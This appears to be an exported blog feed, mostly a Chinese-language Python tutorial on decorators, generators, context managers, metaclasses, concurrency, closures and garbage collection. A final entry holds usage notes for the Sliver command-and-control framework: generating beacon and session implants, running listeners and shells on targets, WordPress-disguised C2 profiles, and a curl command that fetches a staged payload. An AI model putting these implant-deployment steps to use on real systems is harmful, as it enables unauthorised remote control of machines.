装饰器是一个接受函数作为输入并返回一个新函数的高阶函数，用于扩展函数或方法的功能。
基本语法：使用@decorator语法来装饰函数，装饰器本质上是一个包装函数。
带参数的装饰器：可以通过嵌套函数来创建带参数的装饰器。
多个装饰器：可以使用多个装饰器来装饰一个函数，装饰器按从下到上的顺序执行。
**functools.wraps**：确保装饰器能够保留原函数的元数据（如__name__和__doc__等）。

装饰器为Python提供了一个强大的工具，可以在不修改函数内部代码的情况下，灵活地增加或修改其行为。

生成器和迭代器生成器与迭代器在Python中，生成器（Generator）和迭代器（Iterator）是用于实现迭代操作的两种重要工具。它们都用于遍历一个集合或序列中的元素，但它们的工作方式和实现原理有所不同。理解生成器和迭代器的区别和使用场景对编写高效的Python代码非常重要。
迭代器（Iterator）迭代器的定义迭代器是一个对象，它实现了__iter__()和__next__()方法。这使得该对象可以被迭代，从而依次返回集合中的元素。

__iter__()：返回一个迭代器对象，通常返回self。
__next__()：返回集合中的下一个元素。如果没有更多元素，抛出StopIteration异常。

创建迭代器Python中的list、tuple、dict等容器类型本身就已经是可迭代的，也就是说，它们是默认的迭代器。我们可以使用iter()函数将这些容器类型转化为迭代器，并使用next()函数进行遍历。
示例：使用迭代器遍历列表numbers = [1, 2, 3, 4, 5]iterator = iter(numbers)  # 创建迭代器print(next(iterator))  # 输出：1print(next(iterator))  # 输出：2print(next(iterator))  # 输出：3

在这个例子中，iter(numbers)创建了一个列表的迭代器，next(iterator)用于获取列表中的下一个元素。迭代器通过不断调用next()方法来遍历集合中的元素。
自定义迭代器我们也可以通过自定义类来实现迭代器。
class Counter:    def __init__(self, low, high):        self.current = low        self.high = high    def __iter__(self):        return self    def __next__(self):        if self.current &gt; self.high:            raise StopIteration        else:            self.current += 1            return self.current - 1# 创建一个从0到4的计数器counter = Counter(0, 4)for num in counter:    print(num)

在这个例子中，我们自定义了一个Counter类，使其可以作为迭代器使用。__next__()方法返回当前计数，并在超出high值时抛出StopIteration异常。
迭代器的优点
节省内存：迭代器通常不会一次性加载所有数据，而是逐个生成数据项。因此，它非常适用于大数据集的遍历。
无限序列：迭代器可以生成无限序列，只要没有达到停止条件，迭代器就会继续生成数据。

生成器（Generator）生成器的定义生成器是使用yield语句的函数。生成器函数与普通函数的区别在于，当执行到yield语句时，函数的执行会暂停，并将当前值返回给调用者。下次调用时，生成器函数从上次暂停的地方继续执行。生成器函数不返回一个值，而是返回一个生成器对象，它实现了迭代器协议，具备 __iter__() 和 __next__() 方法。  
创建生成器生成器是通过函数中使用yield关键字来创建的。每次调用生成器的__next__()方法时，函数会从上次停止的地方继续执行。
示例：使用yield创建生成器def countdown(n):    while n &gt; 0:        yield n  # 暂停并返回当前值        n -= 1gen = countdown(5)print(next(gen))  # 输出：5print(next(gen))  # 输出：4print(next(gen))  # 输出：3

在这个例子中，countdown()是一个生成器函数，它从n开始倒计时，每次通过yield返回当前的n值。每次调用next()时，生成器从上次暂停的地方继续执行。
生成器的特点
延迟计算：生成器并不在创建时就生成所有的值，而是每次调用next()时生成一个新值。它仅在需要时才生成下一个值，适合处理大数据集。
内存效率：由于生成器不会一次性将所有数据加载到内存中，它们非常节省内存。适用于大规模数据处理。

生成器与迭代器的关系生成器是实现迭代器的一种特殊方式，实际上，生成器就是一种迭代器。它使用yield生成数据，并通过__next__()方法进行遍历。与手动实现的迭代器相比，生成器更简洁、灵活。
生成器表达式除了使用生成器函数，Python还允许通过生成器表达式来创建生成器。这类似于列表推导式，但它返回的是一个生成器，而不是一个列表。
示例：使用生成器表达式gen = (x * x for x in range(5))print(next(gen))  # 输出：0print(next(gen))  # 输出：1print(next(gen))  # 输出：4

在这个例子中，(x * x for x in range(5))是一个生成器表达式，它生成了0到4的平方值。与列表推导式不同，生成器表达式不会立即生成所有的值，而是每次请求一个新值时才计算。
生成器表达式的优点
简洁：生成器表达式提供了一种简洁的方式来创建生成器。
节省内存：它不会一次性计算并存储所有的值，而是每次请求一个值时才计算。

总结迭代器
迭代器是实现了__iter__()和__next__()方法的对象。
可以通过iter()和next()函数来使用。
适用于需要逐步获取数据的场景，节省内存。

生成器
生成器是使用yield的函数。
生成器通过暂停和恢复的机制，按需生成数据。
适用于需要延迟计算和节省内存的场景。

生成器与迭代器的关系
生成器是迭代器的一种特殊实现，生成器函数通过yield返回一个可迭代的对象。
与普通迭代器相比，生成器通常更加简洁且内存效率更高。


上下文管理器上下文管理器（Context Managers）上下文管理器是Python中用于管理资源（如文件、网络连接、数据库连接等）的一种机制。它允许开发者在某个代码块执行之前和之后自动执行特定的操作，如打开资源、释放资源等。上下文管理器通过with语句来使用，它确保在使用完资源后进行必要的清理工作，不论代码块中是否发生异常。
上下文管理器在处理资源时非常有用，尤其在确保资源得到释放时（如文件关闭、数据库连接关闭、锁释放等）。通过使用上下文管理器，我们可以避免写重复的清理代码，并使代码更加简洁和安全。
with语句的基本语法上下文管理器的核心是with语句，with语句会自动管理代码块的前后资源，确保资源的正确使用与释放。它的基本语法如下：
with context_manager as variable:    # 执行的代码块


context_manager是实现了上下文管理协议的对象。
variable是上下文管理器提供的资源，可以在代码块中使用。

使用内建的上下文管理器Python提供了一些内建的上下文管理器，最常见的就是用于处理文件操作的open()函数，它可以自动管理文件的打开和关闭。
示例：使用with管理文件操作with open(&quot;sample.txt&quot;, &quot;r&quot;) as file:    content = file.read()    print(content)

在这个例子中，open(&quot;sample.txt&quot;, &quot;r&quot;)返回一个上下文管理器对象。with语句确保文件在使用完毕后被正确关闭。即使在read()操作过程中抛出异常，文件也会被正确关闭。
with语句的工作原理当with语句执行时，Python会执行上下文管理器的__enter__()方法，然后进入代码块。代码块执行完毕后，无论是否发生异常，都会执行上下文管理器的__exit__()方法来进行清理工作。
自定义上下文管理器Python允许我们自定义上下文管理器。要创建一个上下文管理器，我们需要实现__enter__()和__exit__()方法。__enter__()方法用于进入上下文管理器的代码块，__exit__()方法用于退出代码块时进行清理工作。
示例：自定义上下文管理器class MyContextManager:    def __enter__(self):        print(&quot;Entering the context&quot;)        return self  # 可以返回任意对象，通常返回`self`        def __exit__(self, exc_type, exc_value, traceback):        print(&quot;Exiting the context&quot;)        if exc_type is not None:            print(f&quot;An exception occurred: &#123;exc_value&#125;&quot;)        return True  # 如果返回`True`，则不会再抛出异常；如果返回`False`或`None`，异常将继续传播with MyContextManager() as cm:    print(&quot;Inside the context&quot;)    # 可以模拟异常来测试异常处理    # raise ValueError(&quot;An error occurred!&quot;)

在这个例子中，MyContextManager类实现了上下文管理器所需的__enter__和__exit__方法：

__enter__()方法在with语句执行前调用。它通常用于获取资源，并返回一个值供as后面的变量使用。
__exit__()方法在with语句执行完毕后调用。它用于处理资源清理。如果在with块内抛出异常，__exit__()方法会捕获到异常信息，并可以选择是否抛出异常。

输出：Entering the contextInside the contextExiting the context

如果你取消注释代码中抛出异常的部分：
输出（带异常）：Entering the contextInside the contextExiting the contextAn exception occurred: An error occurred!

__enter__()与__exit__()的细节
**__enter__()**：
__enter__()方法在代码块执行之前调用，通常用于初始化资源。
它的返回值可以传递给with语句中的as变量。


**__exit__()**：
__exit__()方法在代码块执行结束时调用，无论代码块是否正常结束。如果代码块内有异常抛出，__exit__()会捕获到异常类型、异常值和回溯信息。
如果__exit__()返回True，异常将被抑制，不会传播；如果返回False或None，异常将继续传播。



上下文管理器的常见应用1. 文件操作文件的打开和关闭是最常见的上下文管理器应用。with语句确保文件在使用完毕后自动关闭，避免遗漏关闭文件的问题。
with open(&#x27;file.txt&#x27;, &#x27;r&#x27;) as f:    content = f.read()    print(content)

2. 数据库连接数据库连接也常常需要使用上下文管理器来保证连接在使用完毕后能够自动关闭。
import sqlite3class DatabaseConnection:    def __enter__(self):        self.connection = sqlite3.connect(&quot;example.db&quot;)        return self.connection        def __exit__(self, exc_type, exc_value, traceback):        self.connection.close()        print(&quot;Database connection closed&quot;)with DatabaseConnection() as conn:    cursor = conn.cursor()    cursor.execute(&quot;SELECT * FROM users&quot;)    print(cursor.fetchall())

在这个例子中，DatabaseConnection类是一个自定义的上下文管理器，它确保数据库连接在with语句结束后关闭。
3. 锁在并发编程中，锁常常用来保证线程安全。Python的threading模块提供了Lock类，它本身就是一个上下文管理器。
import threadinglock = threading.Lock()with lock:    # 执行需要线程安全的操作    print(&quot;Critical section&quot;)

通过with语句，可以确保锁在with块执行完毕后自动释放，即使发生异常。
总结
上下文管理器是用于管理资源的一种工具，它可以确保资源在使用完毕后被正确地释放。
上下文管理器通过实现__enter__()和__exit__()方法来定义资源的获取和清理。
with语句是Python中使用上下文管理器的主要语法，它可以确保资源的正确管理，避免资源泄露。
上下文管理器的应用场景包括文件操作、数据库连接、锁等。

通过使用上下文管理器，Python代码更加简洁、清晰，同时能够有效地管理资源，避免忘记清理资源的问题。

元编程与反射这块内容有些抽象, 不知道具体应用, 以后遇到再说吧~
元编程简介元编程是指编写能够操作、修改、生成或执行其他代码的代码。在Python中，元编程通过动态地创建或修改类、函数、方法等，提供了非常强大的灵活性。元编程的一些常见应用包括动态生成代码、修改类行为、实现插件架构等。
Python中最常见的元编程技术是通过 **元类（Metaclasses）**来实现的。
什么是元类？在Python中，元类是定义类的类。所有的类都是由元类创建的，而默认情况下，Python的所有类都是由type元类创建的。普通类是用来创建实例对象的模板。类定义了对象的属性和方法，当我们创建一个类的实例时，就会根据这个类来创建实际的对象。元类是用来创建类的类。换句话说，元类控制类的创建过程，而普通类控制实例的创建过程。元类定义了类如何被构建，它可以在类的创建过程中修改类的定义，比如自动为类添加方法、修改属性、强制类遵循某些规则等. 简单来说，元类决定了类的创建方式，它可以控制类的创建过程，并允许开发者修改类的定义。
例如：class MyClass:    pass# 上述定义的类实际上是由 type 元类创建的print(type(MyClass))  # 输出：&lt;class &#x27;type&#x27;&gt;

在上面的例子中，MyClass类是由type元类创建的。每个类都是type类的实例，因此类本身也是对象。
创建自定义元类通过自定义元类，可以在类创建时修改类的属性和方法。这为高级功能提供了更大的灵活性。
# 自定义元类class MyMeta(type):    def __new__(cls, name, bases, dct):        print(f&quot;Creating class &#123;name&#125;&quot;)        return super().__new__(cls, name, bases, dct) # 使用自定义元类创建类class MyClass(metaclass=MyMeta):    pass

在这个例子中，MyMeta是一个自定义的元类，它通过__new__()方法打印出类的创建信息。在创建MyClass类时，MyMeta元类会被调用。
元类的应用场景
动态生成类：根据需求动态生成类。通过元类，可以在程序运行时创建类。
修改类的行为：可以修改类的方法和属性，甚至为类添加新功能。
实现单例模式：元类可以确保类只有一个实例，这就是单例模式的实现。

反射简介反射是指程序在运行时动态地获取对象的属性、方法，甚至修改它们。通过反射，程序可以访问对象的内部结构，动态地修改对象的状态，甚至调用对象的方法。
在Python中，反射是通过一些内建函数实现的，例如：getattr()、setattr()、hasattr()等。
使用 getattr()、setattr()、hasattr() 进行反射
getattr()：获取对象的属性值。
setattr()：设置对象的属性值。
hasattr()：检查对象是否有某个属性。

示例：使用 getattr()、setattr() 和 hasattr()class MyClass:    def __init__(self):        self.name = &quot;Alice&quot;# 创建对象obj = MyClass()# 获取属性值print(getattr(obj, &#x27;name&#x27;))  # 输出：Alice# 设置属性值setattr(obj, &#x27;name&#x27;, &#x27;Bob&#x27;)print(getattr(obj, &#x27;name&#x27;))  # 输出：Bob# 检查属性是否存在print(hasattr(obj, &#x27;name&#x27;))  # 输出：Trueprint(hasattr(obj, &#x27;age&#x27;))   # 输出：False

在这个例子中：

getattr(obj, &#39;name&#39;) 用来获取obj对象的name属性。
setattr(obj, &#39;name&#39;, &#39;Bob&#39;) 用来设置obj对象的name属性值为Bob。
hasattr(obj, &#39;name&#39;) 检查obj是否有name属性。

动态调用方法反射不仅可以操作属性，还可以动态调用对象的方法。通过getattr()，可以在运行时获取并调用对象的方法。
class MyClass:    def greet(self, name):        print(f&quot;Hello, &#123;name&#125;!&quot;)# 创建对象obj = MyClass()# 动态调用方法method_name = &#x27;greet&#x27;getattr(obj, method_name)(&#x27;Alice&#x27;)  # 输出：Hello, Alice!

在这个例子中，getattr(obj, method_name)返回greet方法，并动态调用它。
使用 inspect 模块获取对象的详细信息Python的inspect模块提供了一些函数，可以帮助开发者在运行时检查对象的结构、方法和参数等信息。
import inspectclass MyClass:    def greet(self, name):        print(f&quot;Hello, &#123;name&#125;!&quot;)params = inspect.signature(MyClass.greet).parametersprint(params)

在这个例子中，inspect.signature()方法获取了greet方法的参数信息，输出的是方法的签名和参数。
元编程与反射的应用场景动态生成类和方法元编程可以用于根据需求动态生成类和方法。比如，开发一个框架，它需要根据不同的配置动态创建类，或者在运行时根据不同条件生成不同的方法。
动态修改类的行为反射使得程序可以在运行时修改类的属性和方法。例如，某些功能需要在运行时调整对象的行为，这时候可以使用反射修改类的属性，甚至为对象添加新的方法。
插件架构元编程和反射常用于实现插件架构。在这种架构中，主程序通过反射动态加载插件，而插件不需要在主程序中硬编码。插件可以在运行时被动态加载、卸载或更新。
调试和测试工具反射能够帮助调试工具或测试框架检查对象的状态、方法、成员等。例如，测试框架通过反射自动发现并运行测试方法，而不需要显式地列出每个方法的名称。

并发编程并发编程简介并发编程是指在程序中同时执行多个任务，以提高程序的效率，充分利用计算机的多核处理能力。并发编程的核心目标是通过并行或并发执行任务，优化程序的性能，尤其是在处理I&#x2F;O密集型或CPU密集型任务时。
Python通过多种方式支持并发编程，最常见的方式是多线程（Multithreading）、**多进程（Multiprocessing）和异步编程（Asynchronous Programming）**。每种方式有其适用的场景和优势。
多线程（Multithreading）多线程是指在同一个进程中创建多个线程，每个线程执行一个任务。线程之间共享进程的内存空间，因此它们可以更高效地通信，但需要注意线程同步问题。
Python中的线程Python通过threading模块支持多线程。虽然Python的全局解释器锁（GIL）限制了多线程在CPU密集型任务中的并行性，但它仍然适用于I&#x2F;O密集型任务。
示例：使用threading模块创建线程import threadingimport timedef task(name):    print(f&quot;Thread &#123;name&#125; started&quot;)    time.sleep(2)    print(f&quot;Thread &#123;name&#125; finished&quot;)# 创建并启动多个线程threads = []for i in range(3):    t = threading.Thread(target=task, args=(i,))    threads.append(t)    t.start()# 等待所有线程完成for t in threads:    t.join()

在这个例子中，创建了三个线程，每个线程都执行task函数。join()方法确保主线程在所有子线程完成之前不会退出。
线程的优缺点
优点：
适用于I&#x2F;O密集型任务（如文件读写、网络请求等），能够在等待I&#x2F;O操作时并发执行其他任务。
线程之间的通信比进程间通信更简单，因为它们共享内存。


缺点：
由于GIL的存在，线程在执行CPU密集型任务时无法充分利用多核CPU。
线程共享内存，容易出现数据竞争和死锁问题。



多进程（Multiprocessing）多进程是指创建多个进程来并行执行任务，每个进程都有独立的内存空间和资源。进程间相互独立，因此它们不会像线程那样出现共享内存的问题。
Python中的多进程Python通过multiprocessing模块支持多进程。由于每个进程有独立的内存空间，因此多进程可以避免GIL的限制，适用于CPU密集型任务。
示例：使用multiprocessing模块创建进程import multiprocessingimport timedef task(name):    print(f&quot;Process &#123;name&#125; started&quot;)    time.sleep(2)    print(f&quot;Process &#123;name&#125; finished&quot;)# 创建并启动多个进程processes = []for i in range(3):    p = multiprocessing.Process(target=task, args=(i,))    processes.append(p)    p.start()# 等待所有进程完成for p in processes:    p.join()

在这个例子中，创建了三个进程，每个进程执行task函数。进程之间相互独立，因此它们不会影响彼此的内存空间。
多进程的优缺点
优点：
可以充分利用多核CPU，适用于CPU密集型任务（如大规模计算、数据处理等）。
进程之间独立，避免了线程共享内存的复杂性。


缺点：
进程之间的通信较为复杂，需要使用Queue、Pipe等进程间通信机制。
创建和管理进程的开销比线程大，因此在启动多个进程时需要谨慎。



异步编程（Asynchronous Programming）异步编程是一种不同于传统同步编程的编程方式，它允许程序在等待某些操作（如I&#x2F;O操作）时继续执行其他任务，而无需阻塞程序的执行。Python的asyncio模块提供了异步编程的核心支持。
Python中的异步编程Python的asyncio模块使得编写异步代码变得更加容易。通过async和await关键字，开发者可以定义异步函数并执行异步任务。
示例：使用asyncio实现异步编程import asyncioasync def task(name):    print(f&quot;Task &#123;name&#125; started&quot;)    await asyncio.sleep(2)  # 模拟I/O操作    print(f&quot;Task &#123;name&#125; finished&quot;)async def main():    tasks = [task(i) for i in range(3)]    await asyncio.gather(*tasks)# 执行异步任务asyncio.run(main())

在这个例子中，task是一个异步函数，await asyncio.sleep(2)模拟了一个耗时的I&#x2F;O操作。通过asyncio.gather()可以并发执行多个异步任务。
异步编程的优缺点
优点：
适用于I&#x2F;O密集型任务，能够在等待I&#x2F;O操作时执行其他任务，显著提高程序效率。
相比线程和进程，异步编程的开销较小，因为它不需要创建和管理多个线程或进程。


缺点：
异步编程的逻辑较为复杂，调试和维护比传统的同步编程更加困难。
仅适用于I&#x2F;O密集型任务，对于CPU密集型任务并不能提高性能。



Python中的并发编程模型选择在Python中，可以根据任务的性质选择不同的并发编程模型：
1. 多线程
适用场景：I&#x2F;O密集型任务，如网络请求、文件读写等。
优点：线程之间共享内存，通信开销较小。
缺点：由于GIL的限制，不能有效提高CPU密集型任务的性能。

2. 多进程
适用场景：CPU密集型任务，如大规模计算、数据处理等。
优点：可以充分利用多核CPU。
缺点：进程间通信复杂，创建和管理进程的开销较大。

3. 异步编程
适用场景：I&#x2F;O密集型任务，尤其是大量并发I&#x2F;O操作的场景。
优点：无需创建线程或进程，开销较小，适用于大量并发I&#x2F;O操作。
缺点：调试复杂，代码较难理解和维护。


单元测试与测试框架
性能优化使用合适的数据结构数据结构的选择对性能影响巨大。标准库中的一些内建结构和模块比手动实现更高效。
使用set代替list查找# 差if item in my_list: ...# 好if item in my_set: ...

集合（set）的查找是哈希结构，平均时间复杂度是 O(1)，而列表是 O(n)。
使用collections模块
deque：双端队列，适合频繁的头尾插入和删除。
defaultdict：自动初始化字典值，避免键不存在的判断。
Counter：高效地统计元素频次。

from collections import Counterdata = [&quot;apple&quot;, &quot;banana&quot;, &quot;apple&quot;]counter = Counter(data)print(counter[&quot;apple&quot;])  # 输出：2


避免不必要的循环和计算使用生成式替代显式循环# 差squares = []for i in range(1000):    squares.append(i * i)# 好squares = [i * i for i in range(1000)]

使用生成器避免内存爆炸列表会一次性加载所有元素，占用大量内存。生成器按需生成，节省资源。
# 差：占用内存nums = [i for i in range(1000000)]# 好：节省内存nums = (i for i in range(1000000))


减少全局变量的访问函数内部访问局部变量比访问全局变量快，Python 会优先从局部命名空间查找变量。
# 差def compute():    for i in range(1000):        x = GLOBAL_VALUE * i# 好def compute():    local = GLOBAL_VALUE    for i in range(1000):        x = local * i


内置函数与库优先Python 的内置函数是用 C 语言实现的，效率通常比手写循环高。常见函数包括：

sum()
max() &#x2F; min()
sorted()
map() &#x2F; filter()
zip() &#x2F; enumerate()

# 差total = 0for num in nums:    total += num# 好total = sum(nums)


使用itertools进行高效迭代itertools模块提供了一批高效的迭代工具，支持惰性求值，适合处理大数据流。
from itertools import islice# 取前10个元素，无需生成整个序列result = islice((x * x for x in range(100000)), 10)print(list(result))


函数缓存对重复调用且参数相同的函数可以使用缓存，提高效率。
from functools import lru_cache@lru_cache(maxsize=128)def fib(n):    if n &lt; 2:        return n    return fib(n - 1) + fib(n - 2)

@lru_cache 是内置的装饰器，用于自动缓存函数的返回值，避免重复计算。

利用多进程与多线程在 CPU 密集型任务中使用多进程（multiprocessing），在 I&#x2F;O 密集型任务中使用多线程（threading）或异步编程（asyncio）来提升程序吞吐能力。
from multiprocessing import Pooldef work(x):    return x * xwith Pool(4) as p:    result = p.map(work, range(1000))


使用 Cython、Numba 等工具加速计算当 Python 本身难以再优化时，可以考虑使用 C 扩展、JIT 编译等方式提高执行速度。

Cython：将 Python 编译为 C，提高运行速度。
Numba：JIT 编译 Python 代码，自动优化数值计算函数。

from numba import jit@jitdef fast_add(x, y):    return x + y


使用合适的文件与数据格式
文本格式（如 CSV）处理慢，适合用作人类可读。
二进制格式（如 pickle、protobuf、parquet）在性能和体积上更优。
大数据处理可使用 pandas 加载高效的数据格式。


分析工具与性能监控优化前，先找到慢的地方。推荐使用以下工具定位性能瓶颈：

timeit：测试小段代码运行时间。
cProfile：分析程序中各函数的耗时。
line_profiler：按行查看函数的性能。


闭包闭包的概念**闭包（Closure）**是函数式编程中的一个重要概念。简单来说，闭包是指一个函数能够“记住”并访问它定义时的作用域，即使在外部函数已经执行完毕后，内部函数仍然能够访问外部函数的局部变量。
闭包是通过将函数作为返回值返回来实现的。它不仅仅是一个普通的返回函数，而是包含了对外部作用域的引用。
闭包的构成一个闭包包含三个部分：

外部函数：闭包是由外部函数创建的。
内部函数：在外部函数内部定义的函数。
自由变量（Free variables）：外部函数中的局部变量，内部函数仍能访问它们，称为自由变量。


闭包的特点
内部函数引用了外部函数的局部变量。
外部函数返回了内部函数的引用，使得外部函数的局部变量能“保留”下来。
闭包可以访问外部函数的变量，即使外部函数已经执行结束。


闭包的示例基本示例def outer(x):    def inner(y):        return x + y    return innerclosure = outer(10)  # outer(10) 返回的是 inner 函数print(closure(5))     # 输出：15， 10 + 5

在这个例子中：

outer 是外部函数，inner 是内部函数。
inner 可以访问外部函数 outer 的参数 x。
closure 通过调用 outer(10) 得到 inner 函数的引用，并且保留了 x = 10 这个变量。


闭包的应用场景函数工厂闭包可以用来创建函数工厂，即根据不同的输入参数创建不同的函数。
def make_adder(x):    def adder(y):        return x + y    return adderadd_5 = make_adder(5)print(add_5(10))  # 输出：15

在这个例子中，make_adder 函数返回一个加法函数 adder，而 adder 会记住 x 的值。add_5 就是一个通过闭包生成的函数，它始终会把 5 加到输入的参数上。
延迟计算闭包也可用于延迟计算，能够保留计算所需的环境。
示例：生成一系列延迟计算的函数
def make_counter():    count = 0    def counter():        nonlocal count        count += 1        return count    return countercounter1 = make_counter()print(counter1())  # 输出：1print(counter1())  # 输出：2counter2 = make_counter()print(counter2())  # 输出：1

在这个例子中，make_counter 返回一个计数器函数 counter，每次调用 counter 时会增加 count 的值，并且 count 变量通过闭包被保存下来。counter1 和 counter2 是两个独立的计数器，它们互不干扰。

闭包与函数式编程闭包是函数式编程中的一个重要特性，能够使函数作为返回值返回，并且带有环境信息。这种特性为实现函数工厂、延迟计算、函数式组合等提供了强大的支持。
通过闭包，可以创建高阶函数（接受或返回函数的函数），并且能在不显式传递参数的情况下，保持函数内部的状态。

总结
闭包是指一个函数能够记住并访问其定义时的作用域，即使外部函数已经执行完毕。
闭包的关键是内部函数对外部函数变量的引用，以及外部函数返回的内部函数。
闭包常用于函数工厂、延迟计算等场景，能提高代码的灵活性和可复用性。

通过使用闭包，可以更好地管理状态、提高函数的复用性，并且在构建一些高级功能时，提供更多的灵活性。

垃圾回收机制Python 的垃圾回收机制是自动管理内存的一种方式，它通过引用计数和循环垃圾回收来确保不再使用的内存得到回收。垃圾回收机制的目的是避免内存泄漏，并帮助开发者更好地管理内存，减少程序中的内存管理负担。

引用计数（Reference Counting）引用计数是 Python 中的基本内存管理机制。每当一个对象被引用时，Python 会将该对象的引用计数加 1；当引用不再指向该对象时，引用计数会减 1。如果一个对象的引用计数变为 0，表示没有任何变量或对象再引用它，Python 会自动回收该对象所占的内存。
引用计数的工作原理
当一个变量或对象引用其他对象时，Python 会为该对象增加引用计数。随着对象的生命周期变化，引用计数会增加或减少。当一个对象的引用计数最终降为 0 时，意味着没有任何引用指向该对象，Python 会自动销毁该对象并回收其占用的内存。
import sysa = []  # 创建一个空列表print(sys.getrefcount(a))  # 输出：2，包含a自身和引用它的getrefcountb = a  # b 也引用 aprint(sys.getrefcount(a))  # 输出：3

在这个例子中，sys.getrefcount(a) 返回的是对象 a 的引用计数。每当有新的变量引用 a 时，引用计数就会增加。
引用计数的局限性
虽然引用计数是一种简单高效的内存管理方式，但它有一个缺点：无法处理循环引用。如果两个对象互相引用，且没有其他地方引用它们，它们的引用计数将永远不会为 0，从而导致内存泄漏。

循环垃圾回收（Cycle Garbage Collection）为了处理循环引用问题，Python 引入了 循环垃圾回收机制。当多个对象相互引用时，它们的引用计数可能永远不为 0，导致它们的内存无法释放。Python 的循环垃圾回收机制会定期检查这些循环引用，并回收不再使用的内存。
分代垃圾回收Python 的垃圾回收机制采用了分代收集（Generational Collection）策略。对象根据其生命周期被划分为三代：

第一代：新创建的对象。
第二代：经过一次或多次垃圾回收后仍然存活的对象。
第三代：经历多次垃圾回收且依然存活的对象。

垃圾回收的主要策略是：新创建的对象会放入第一代，经过一次或多次垃圾回收后，仍然存活的对象会被提升到第二代或第三代。Python 会优先对第一代对象进行回收，因为它们可能更容易被销毁。
循环引用的检测与回收Python 的垃圾回收机制会检测到对象之间的循环引用，并在适当的时候回收这些对象。为了优化性能，Python 不会在每次垃圾回收时都检查所有对象，而是采用增量的方式，只在一定条件下检查和回收循环引用。

gc 模块Python 提供了一个名为 gc 的模块，用于控制和调试垃圾回收过程。gc 模块允许开发者手动触发垃圾回收、检查回收状态，并获取内存使用的相关信息。
常用的 **gc** 函数

**gc.collect()**：手动启动垃圾回收，清除未被引用的对象。
**gc.get_count()**：返回当前垃圾回收的计数，显示每代垃圾回收的次数。
**gc.set_debug()**：设置垃圾回收的调试输出，用于查看垃圾回收的详细过程。

示例：
import gcgc.collect()  # 强制启动垃圾回收print(gc.get_count())  # 获取垃圾回收计数

通过这些工具，开发者可以在需要时手动控制垃圾回收过程，避免内存泄漏或不必要的资源占用。

内存泄漏的防范尽管 Python 使用垃圾回收机制来管理内存，但不当的代码使用仍然可能导致内存泄漏。特别是循环引用或未清理的缓存，可能导致对象无法被回收，造成内存泄漏。为防止内存泄漏，可以采取以下措施：
避免循环引用尽量避免对象之间互相引用，特别是在复杂的对象之间。使用弱引用（weakref）可以有效防止对象在不需要时仍然占用内存。
显式删除不再需要的引用当某个对象不再使用时，可以显式地将其引用设为 None 或使用 del 删除对象，以帮助垃圾回收器更早地回收内存。
a = SomeLargeObject()del a  # 显式删除引用

使用弱引用（weakref）通常，当创建一个对象的引用时（例如通过变量或数据结构引用它），Python 会增加该对象的引用计数。当引用计数为零时，Python 的垃圾回收机制会自动销毁该对象。这个过程通常被称为 强引用。
而 弱引用 与此不同，它不会增加对象的引用计数。因此，如果一个对象仅被弱引用指向，它仍然可以被垃圾回收器销毁，不会因为存在弱引用而延长其生命周期。
在缓存或对象池中，使用弱引用（weakref）可以避免对对象的强引用，确保对象在没有其他引用时能够及时被回收。
import weakrefclass MyClass:    passobj = MyClass()weak_ref = weakref.ref(obj)print(weak_ref())  # 返回对象本身


]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Sliver</title>
    <url>/2025/07/30/Sliver/</url>
    <content><![CDATA[常用命令运行服务
虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可

# 正常进入sliver-server的交互式命令行界面sliver-server# 后台跑sliver-server，适用于需要多用户的情况下，但是要先生成用户的配置文件sliver-server daemon

基础命令# 生成sessiongenerate -b localhost --os linux --skip-symbols --debug -s temp/# 生成beacongenerate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux# 查看生成的beacon和sessionimplants# 启动http监听http# 查看正在监听的服务jobs# 查看已经拿到的sessionsessions# 查看已经拿到的beaconbeacons# 进入某个目标进行交互use# 退出serverexit# 查看某个目标的信息info# 查看某个beacon的响应时间信息beacons watch

交互命令# 查看目标基础信息info# 进入shellshell# 退出background# 基础的文件操作、目录，通过help命令查询lspwdcdmv .....# 设置beacon的响应时间和抖动时间reconfig -i 3s -j 1s# 查看beacon的命令执行状态tasks# 查看beacon的某个命令执行结果tasks fetch# 在beacon上创建一个新的同名session连接，是在当前beacon中创建了一个goroutine线程跑sessioninteractive# 启动socks5，只能在session中跑，socks5代理还不清楚怎么用，端口是在server端还是target端，需要再试试看socks5 start# 查看当前socks5列表socks5# 关闭指定socks5，需要指定idsocks5 stop -i 1# 关停session连接，不能关beacon，并且也不是完全关，下个轮训会自动连回来close

多用户模式服务端，默认是31337**&lt;font style=&quot;color:rgb(255, 255, 255);background-color:rgb(24, 24, 27);&quot;&gt;&lt;/font&gt;**
new-operator --name lyi --lhost 192.168.1.66 -P allmultiplayer

客户端
sliver-client import lyi_192.168.1.66.cfgsliver-client

一般情况建议服务端配置system服务
[Unit]Description=SliverAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=on-failureRestartSec=3User=rootExecStart=/usr/bin/sliver-server daemon[Install]WantedBy=multi-user.target

一行命令进行配置
sudo tee /etc/systemd/system/sliver-server.service &gt; /dev/null &lt;&lt; &#x27;EOF&#x27;[Unit]Description=SliverAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=on-failureRestartSec=3User=rootExecStart=/usr/bin/sliver-server daemon[Install]WantedBy=multi-user.targetEOFsudo systemctl daemon-reloadsudo systemctl enable sliver-serversudo systemctl start sliver-server



如果用了multiplayer命令之后，执行sliver-server daemon就会报告端口已占用，这是因为sliver-server已经启用了multiplayer的job，这时候需要通过jobs查看对应的id，然后jobs -k 2来关闭multiplayer，然后就可以正常跑sliver-server daemon了
C2 Profiles下载这个
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
然后依据这个创建c2profiles
c2profiles generate -f urls-wordpress-3.3.1.txt -n wordpress -

常用命令
查看当前已有的c2profilesc2profiles通过-C在生成beacon时指定c2profilegenerate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux -C wordpress

HTTP Payload staging生成profileprofiles new beacon -b localhost --os linux --skip-symbols --debug profile_test根据profile生成implantprofiles generate profile_test设置implant对外暴露以便通过http下载implants stage

然后通过implants命令查看implant的ID，然后通过curl可以去下载payload
curl http://localhost/test.yml?z=14274

也可以加密
根据profile生成implant，并且加密profiles stage -c gzip profile_test

后续的stage实际上就是执行类似这样的操作
